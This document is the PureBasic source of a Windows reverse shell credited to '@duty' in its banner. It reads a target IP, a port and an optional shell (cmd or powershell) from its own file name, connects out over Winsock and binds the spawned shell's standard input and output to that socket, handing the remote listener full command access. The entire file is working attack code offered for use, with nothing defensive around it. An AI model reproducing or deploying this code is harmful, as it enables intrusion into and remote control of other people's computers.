Global port.l
Global ip.s
Global cmd.s

OpenConsole()
ClearConsole()
; header section

duty$ = "        ___ _         "+#CRLF$
duty$ = duty$ + "       /   \ |_ _   _ "+#CRLF$
duty$ = duty$ + "      / /\ / __| | | |"+#CRLF$
duty$ = duty$ + "     / /_//| |_| |_| |"+#CRLF$
duty$ = duty$ + "    /___,'  \__|\__, |"+#CRLF$
duty$ = duty$ + "                |___/ "+#CRLF$

ver$ = "                   v1.1"

solg$ = "    tiny reverse shell by "
ConsoleColor(13, 0)
Print(duty$)
ConsoleColor(10, 0)
PrintN(ver$)
ConsoleColor(14, 0)
Print(solg$)
ConsoleColor(12, 0)
PrintN("@duty")
; defining section 

Prototype WSAStartup(wVersionRequested.w,*lpWSAData)
Prototype WSAConnect(SOCKET.i,*name,namelen.l,*lpCallerData,*lpCalleeData,*lpSQOS,*lpGQOS)
Prototype WSASocket( af.l,type.l,protocol.l,*lpProtocolInfo,g.l,dwFlags.l)
Prototype inet_addr(IP.s)

OpenLibrary(0,"Ws2_32.dll")
WSAStartup.WSAStartup=GetFunction(0,"WSAStartup")
WSAConnect.WSAConnect=GetFunction(0,"WSAConnect")
WSASocket.WSASocket=GetFunction(0,"WSASocketW")
inet_addr.inet_addr=GetFunction(0,"inet_addr")


wsaData.WSADATA
s1.i
hax.sockaddr_in
ip_addr.s{16}
sui.STARTUPINFO
pi.PROCESS_INFORMATION

Macro Unsigned(iLo, iHi)
  ((iHi<<8)| (iLo& $FF))
EndMacro

name$ = GetFilePart(ProgramFilename())
paramlen.i = CountString(name$,"_")
If paramlen > 1 
; help section
firstparam$ = ProgramParameter(0)
If firstparam$ = "-h"
  Print("    [!] ")
  ConsoleColor(7, 0)
  PrintN("Use filename as parameters example: ")
  ConsoleColor(3, 0)
  PrintN("    dty_127.0.0.1_1337.exe")
  PrintN("    dty_127.0.0.1_1337_cmd.exe")
  PrintN("    dty_127.0.0.1_1337_powershell.exe")
  ConsoleColor(7, 0)
  Goto exit
EndIf

If paramlen = 2
    ip = StringField(name$,2,"_")
    port = Val(StringField(Trim(StringField(name$,3,"_")),1,"."))
ElseIf paramlen = 3
    ip = StringField(name$,2,"_")
    port = Val(StringField(name$,3,"_"))
    cmd = StringField(Trim(StringField(name$,4,"_")),1,".")
Else
    Goto exit    
EndIf 
EndIf 
ConsoleColor(13, 0)
Print(duty$)
ConsoleColor(10, 0)
PrintN(ver$)
ConsoleColor(14, 0)
Print(solg$)
ConsoleColor(12, 0)
PrintN("@duty1g")
ConsoleColor(2, 0)
Print("    [*] ")
ConsoleColor(7, 0)
Print("Connecting to ")
ConsoleColor(3, 0)
Print(ip+":"+Str(port))
ConsoleColor(7, 0)
Print("...")

WSAStartup(Unsigned(2, 2), @wsaData)

s1 = WSASocket(#AF_INET, #SOCK_STREAM, #IPPROTO_TCP, #Null,  #Null, #Null)

hax\sin_family = #AF_INET
hax\sin_port = htons_(port)
hax\sin_addr = inet_addr(ip)
hConnect.l = WSAConnect(s1, @hax, SizeOf(hax), #Null, #Null, #Null, #Null)
If hConnect = #SOCKET_ERROR
  ConsoleColor(12, 0)
  PrintN("[Failed]")
  ConsoleColor(7, 0)
 Else
  ConsoleColor(10, 0)
  PrintN("[Success]")
  ConsoleColor(7, 0)
  ZeroMemory_(@sui, SizeOf(sui))
  sui\cb = SizeOf(sui)
  sui\dwFlags = (#STARTF_USESTDHANDLES | #STARTF_USESHOWWINDOW)
  sui\hStdInput =  s1:sui\hStdOutput = s1:sui\hStdError =  s1
  If Len(cmd) > 0
    commandLine$= cmd + ".exe"
  Else  
    commandLine$= "cmd.exe"
  EndIf 
  CreateProcess_(0, @commandLine$, #Null, #Null, #True,0, #Null, #Null, @sui, @pi)
EndIf
exit:
CloseConsole()
